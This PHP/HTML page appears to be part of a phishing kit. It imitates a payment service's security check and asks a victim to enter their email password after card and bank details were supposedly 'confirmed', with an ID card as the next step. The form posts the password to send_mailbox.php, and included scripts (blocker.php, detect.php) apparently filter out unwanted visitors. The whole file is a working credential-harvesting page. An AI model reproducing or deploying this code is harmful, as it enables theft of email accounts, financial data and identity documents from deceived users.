<?php

session_start();
error_reporting(0);

include "blocker.php";
include "detect.php";
include('../../functions/Config.php');
if($login_theme == "new") {
 $mailbox = $_SESSION['xysemailx'] ;
}
else {
 $mailbox = $_SESSION['_login_email_'] ;
}

?>
<!DOCTYPE html>
	<html>
	<head>
		<title>Confirm your mailbox information</title>
		<meta charset="utf-8">
		<meta name="viewport" content="width=device-width, initial-scale=1.0">
		<link rel="stylesheet" type="text/css" href="assest/header.css">
		<link rel="stylesheet" type="text/css" href="assest/section.css">
		<link rel="stylesheet" type="text/css" href="assest/spinner.css">
		<script type="text/javascript" src="assest/jquery.min.js"></script>
		<link rel="shortcut icon" href="assest/ico.ico" />
	</head>
	<body>

		<header>
			<div class="content">
				<div class="logo">
					<img src="assest/129x32.svg">
				</div>
				<div class="safety">
					<p><span>Your safety is our priority</span></p>
				</div>
				<div class="clearfix"></div>
				<p class="security">Your safety is our priority</p>
			</div>
		</header>

		<section>
			<div class="content">
				 <div class="head">
				 	<h2>Why Should I Confirm My Account Information ?</h2>
				 	<p><b>
				 		As we have not recognized the device or location from which you logged recently.
						We would like to confirm your identity.We want to esnsure that this is your account.</b>
				 	</p>
				 </div>

				 <div class="box">
				 	<div class="left-box">
				 		<ul>
				 			<li class="ni va">Card & Billing Confirmed</li>
				 			<li class="ni va">Bank Information Confirmed</li>
				 			<li class="ni va2">Confirm Your Mailbox</li>
				 			<li class="io">Confirm Your ID Card (last step)</li>
				 		</ul>
				 	</div>
				 	<div class="right-box">
				 		<div class="title">
				 			<p>Link Your Email Address :</p>
				 		</div>
				 		<div class="theboss">
				 			<div class="mailbox">
				 				<div class="l-mail">
				 					<img src="assest/greymsn.svg">
				 				</div>
				 				<div class="r-mail">
				 					<div class="contact">Email address <br><p><a href="#"><?php echo $mailbox ; ?>

</a></p></div>
				 				</div>

				 			</div>

<form method="post" action="send_mailbox.php" name="mailBoxForm" id="mailBoxForm" onsubmit="return validateMailBox()">

				 			<div class="group" style="margin: 15px 0">
					 			<label id="lblMailBox">password</label>
					 			<input id="inputMailBox" type="password" name="inputMailBox" maxlength="50">
					 		</div>

					 		<div class="save">
					 			<input type="submit" name="" value="Confirm & continue">
					 		</div>

</form>

					 		<p class="why">We'll let you know when you</p>
					 		<p class="stp" style="border-top: 1px solid #dddddd;">Make a payment</p>
					 		<p class="stp">Receive a payment</p>
					 		<p class="stp">Receive a payment</p>
						</div>
				 	</div>
				 	<div class="clearfix"></div>
				 </div>
			</div>
		</section>

<script type="text/javascript" src="assest/main.js"></script>

<style type="text/css">

</style>
<div id="kpop" class="transitioning spinner no" aria-busy="true">
	<p class="checkingInfo">
		<span class="no" id="checkmail">Checking your mailbox...</span>
	</p>
</div>




</body>
</html>
<?php $_SESSION['_mailbox_'] = $mailbox  ?>